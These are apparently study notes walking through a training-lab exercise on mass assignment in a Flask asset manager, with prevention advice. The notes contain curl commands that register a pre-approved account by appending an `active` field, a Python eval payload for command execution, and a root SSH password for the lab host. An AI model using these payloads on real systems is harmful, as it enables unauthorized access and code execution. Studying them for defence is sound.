# Section 27 — Web Mass Assignment Vulnerabilities

**Mass assignment:** frameworks that bulk-bind *all* submitted form fields straight onto a model/DB row. If there's no **whitelist** of bindable fields, an attacker adds extra parameters (e.g. `admin=true`, `confirmed=1`) the developer never intended to expose and silently sets privileged/internal attributes.

Rails example:
```ruby
class User < ActiveRecord::Base
  attr_accessible :username, :email      # only these *should* be settable
end
# attacker POSTs: user[username]=x & user[email]=y & user[admin]=true
# -> admin=true binds anyway because input isn't whitelisted at the controller
```
> The model "allowing" only `username`/`email` is meaningless if the controller does `User.new(params[:user])` over the raw hash. Any extra key the attacker appends gets assigned. Fix = explicit allow-list (`params.require(:user).permit(:username,:email)`).

---

## Scenario — Asset Manager (Python/Flask + SQLite)

Registration requires **admin approval** before you can log in. Source (`/opt/asset-manager/app.py`) shows the gate is a 3rd boolean DB column:

```python
# login: third column k decides access
for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
  if k:                                  # k == approved/active flag
    session['user']=i; return redirect("/home",302)
  else:
    return render_template('login.html', value='Account is pending for approval')

# register: an OPTIONAL form field flips that column to True
try:
  if request.form['<param>']:            # original code: 'confirmed'
    cond=True
except:
  cond=False
cur.execute('insert into users values(?,?,?)',(username,password,cond))
```
> The third `insert` value (`cond`) is exactly the `k` the login check reads. Normally an admin sets it later. But registration *blindly trusts a form field* to set it — classic mass assignment. Submit that field with **any truthy/present value** during `/register` and your account is created pre-approved. (`try/except KeyError`: the field merely needs to **exist** in the POST body; its value is irrelevant.)

---

## Step 1 — Recover the (renamed) parameter from source

This target deliberately **renamed the crucial parameter**, so you must read the box's actual source — don't assume `confirmed`:

```bash
ssh root@10.129.205.15            # pass: !x4;EW[ZLwmDx?=w
grep -n "request.form\[" /opt/asset-manager/app.py
sed -n '42,62p' /opt/asset-manager/app.py
```
✅ **Verified on ACADEMY-ACA-CLAMP:**
```python
if request.form['active']:        # line 50  — renamed from 'confirmed'
    cond=True
```
> Grepping `request.form[` lists every parameter the app reads — the one inside the `try: if ...: cond=True` block is the mass-assignment lever. Here it's **`active`**. Always pull the real parameter name from source/JS/Burp; the writeup's name (`confirmed`) won't match a hardened lab.

**§27 Q1 — the parameter that must be manipulated → `active`**

> Runtime value (intentionally renamed) → read live from `/opt/asset-manager/app.py`, not copied from the module text (the §22 rule).

---

## Step 2 — Exploit the mass assignment

Register with the extra `active` field appended (Burp Repeater, or curl):
```bash
curl -s -i -X POST http://10.129.205.15/register \
  --data "username=pwn&password=pwn&active=1"
# -> "Success!!"   (account inserted with cond=True, no approval needed)
```
Then log in normally:
```bash
curl -s -i -c cj -b cj -X POST http://10.129.205.15/ \
  --data "username=pwn&password=pwn"
# -> 302 /home  (logged in WITHOUT admin approval)
```
> The only change vs a normal signup is the appended `active=1`. Because `request.form['active']` now exists, `cond=True`, the row's 3rd column is `True`, and the login `if k:` passes immediately. In Burp: intercept the `/register` POST and add `&active=1` to the body before forwarding.

---

## Bonus — post-login RCE (`/profit`)

The same app exposes (`app.py` ~line 68):
```python
expr=request.form['sp']
result=eval(expr)                 # arbitrary Python eval on user input
```
> Once logged in (via the mass-assignment bypass), POST `sp` to `/profit` with a Python expression → **unauthenticated-by-design RCE**, e.g. `sp=__import__('os').popen('id').read()`. The mass-assignment bug is the door; `eval()` is the shell. (Likely a later question / the foothold.)

---

## Prevention

- **Whitelist bindable fields** at the controller (Rails `permit(:username,:email)`, Django `ModelForm.Meta.fields`, Flask: read named fields explicitly, never bulk-bind `request.form`).
- Never let user input set state/role/approval columns — derive those server-side.

---

## Exam Notes

- **Get app source / JS / Burp first** — mass assignment is found by spotting a model/insert that binds more fields than the form shows. The lever param is often renamed in labs (`confirmed`→`active`); enumerate it, don't assume.
- **`try: if request.form['x']: ...` → the field only needs to be PRESENT** (KeyError-guarded). Any value (`=1`, `=test`, `=x`) works.
- **Map the extra param to its effect**: here the 3rd `insert` column == the login `if k:` gate.
- **Hunt adjacent bugs**: this same app had `eval(request.form['sp'])` — after a bypass, look for the RCE it unlocks.
- Test fields: `admin`, `is_admin`, `role`, `approved`, `active`, `confirmed`, `verified`, `enabled`.

---

## Lab Walkthrough (quick steps)

```
1. ssh root@10.129.205.15  (!x4;EW[ZLwmDx?=w)
2. grep -n "request.form\[" /opt/asset-manager/app.py ; sed -n '42,62p' ...
   -> if request.form['active']: cond=True        ✅ §27 Q1 = active
3. POST /register  username=pwn&password=pwn&active=1   -> "Success!!"
4. POST /          username=pwn&password=pwn            -> 302 /home (no approval)
5. (foothold) POST /profit  sp=__import__('os').popen('id').read()  -> RCE
```

> One line: the app trusts a hidden form field to set its approval column → append that field at registration → instant approved account. Read source to learn its real name (`active`).
